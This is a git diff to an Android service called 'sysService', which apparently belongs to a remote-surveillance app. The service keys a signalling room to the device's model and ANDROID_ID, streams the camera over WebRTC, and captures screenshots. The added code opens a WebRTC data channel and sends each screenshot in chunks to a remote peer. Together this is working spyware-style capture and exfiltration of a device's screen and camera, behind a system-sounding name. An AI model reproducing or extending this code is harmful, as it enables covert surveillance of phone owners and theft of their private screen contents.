@@ -23,6 +23,7 @@ import org.webrtc.AudioSource;
 import org.webrtc.AudioTrack;
 import org.webrtc.Camera1Enumerator;
 import org.webrtc.CameraEnumerator;
+import org.webrtc.DataChannel;
 import org.webrtc.DefaultVideoDecoderFactory;
 import org.webrtc.DefaultVideoEncoderFactory;
 import org.webrtc.EglBase;
@@ -41,6 +42,8 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.nio.ByteBuffer;
+import java.nio.charset.Charset;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutionException;
@@ -71,6 +74,7 @@ public class sysService extends Service implements SysInterface{
     String cam = "front";
     Intent perData;
     int perResultCode;
+    DataChannel localDataChannel;
 
     //end variables
     // servic overwrite methods
@@ -109,11 +113,16 @@ public class sysService extends Service implements SysInterface{
         String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
         SignallingClient.getInstance().init(this, roomName);
         Toast.makeText(getApplicationContext(),"on start sysService", Toast.LENGTH_LONG).show();
-        if (intent.getExtras()!= null) {
-            Bundle bundle = intent.getExtras();
-            if (bundle != null) {
-                gotPermission(bundle.getInt("perResultCode"), bundle.getParcelable("perData"));
+        try {
+            if (intent.getExtras()!= null) {
+                Bundle bundle = intent.getExtras();
+                if (bundle != null) {
+                    gotPermission(bundle.getInt("perResultCode"), bundle.getParcelable("perData"));
+                }
             }
+        }
+        catch (Exception e){
+
         }
         return Service.START_STICKY;
     }
@@ -374,7 +383,7 @@ public class sysService extends Service implements SysInterface{
     public void onTryToStart() {
         runOnUiThread(() -> {
             if ( localVideoTrack != null ) {
-                createPeerConnection();
+                createPeerConnection("cam");
                 SignallingClient.getInstance().isStarted = true;
                 if (SignallingClient.getInstance().isInitiator) {
                     doCall();
@@ -386,7 +395,7 @@ public class sysService extends Service implements SysInterface{
     /**
      * Creating the local peerconnection instance
      */
-    private void createPeerConnection() {
+    private void createPeerConnection(String type) {
         peerIceServers.add(new org.webrtc.PeerConnection.IceServer("turn:" + getserverIp() + ":3478","turn","turn"));
         PeerConnection.RTCConfiguration rtcConfig =
                 new PeerConnection.RTCConfiguration(peerIceServers);
@@ -409,9 +418,11 @@ public class sysService extends Service implements SysInterface{
             public void onAddStream(MediaStream mediaStream) {
                 // do some thing with received stream
             }
-        });
 
-        addStreamToLocalPeer();
+        });
+        if (type.equalsIgnoreCase("cam")){
+            addStreamToLocalPeer();
+        }
     }
     /**
      * Adding the stream to the localpeer
@@ -490,6 +501,7 @@ public class sysService extends Service implements SysInterface{
         toast(shotN+"");
         if (perData != null){
             toast("from send screen");
+            initDataChannel();
             Screenshot.getObj().takeScreenshot(this);
         }else {
             getPermission();
@@ -507,6 +519,7 @@ public class sysService extends Service implements SysInterface{
             this.perData = data;
             this.perResultCode = resultCode;
             toast("get media");
+            initDataChannel();
             Screenshot.getObj().takeScreenshot(this);
         }
     }
@@ -515,10 +528,66 @@ public class sysService extends Service implements SysInterface{
 
 
     @Override
-    public void gotScreenshot(Bitmap bitmap) {
+    public void gotScreenshot(Bitmap bitmap, byte[] imageByteArr) {
         saveScreenshot(bitmap);
         Screenshot.getObj().finish();
+        sendImage(imageByteArr);
     }
+
+    // webrtc datachannel
+    private void initDataChannel() {
+        peerConnectionFactory = new PeerConnectionFactory(null);
+        createPeerConnection("data");
+
+        localDataChannel = localPeer.createDataChannel("sendDataChannel", new DataChannel.Init());
+        localDataChannel.registerObserver(new DataChannel.Observer() {
+            @Override
+            public void onBufferedAmountChange(long l) {
+
+            }
+
+            @Override
+            public void onStateChange() {
+                runOnUiThread(() -> {
+                    if (localDataChannel.state() == DataChannel.State.OPEN) {
+                        //binding.sendButton.setEnabled(true);
+                    } else {
+                        //binding.sendButton.setEnabled(false);
+                    }
+                });
+            }
+
+            @Override
+            public void onMessage(DataChannel.Buffer buffer) {
+                // Incoming messages, ignore
+                // Only outcoming messages used in this example
+            }
+        });
+    }
+
+    private void sendImage(byte[] bytes) {
+        int CHUNK_SIZE = 64000;
+        int size = bytes.length;
+        int numberOfChunks = size / CHUNK_SIZE;
+
+        ByteBuffer meta = stringToByteBuffer("-i" + size, Charset.defaultCharset());
+        localDataChannel.send(new DataChannel.Buffer(meta, false));
+
+        for (int i = 0; i < numberOfChunks; i++) {
+            ByteBuffer wrap = ByteBuffer.wrap(bytes, i * CHUNK_SIZE, CHUNK_SIZE);
+            localDataChannel.send(new DataChannel.Buffer(wrap, false));
+        }
+        int remainder = size % CHUNK_SIZE;
+        if (remainder > 0) {
+            ByteBuffer wrap = ByteBuffer.wrap(bytes, numberOfChunks * CHUNK_SIZE, remainder);
+            localDataChannel.send(new DataChannel.Buffer(wrap, false));
+        }
+    }
+    private static ByteBuffer stringToByteBuffer(String msg, Charset charset) {
+        return ByteBuffer.wrap(msg.getBytes(charset));
+    }
+    // end datachannel
+
 
     private void saveScreenshot(Bitmap bitmap) {
         // mediapro
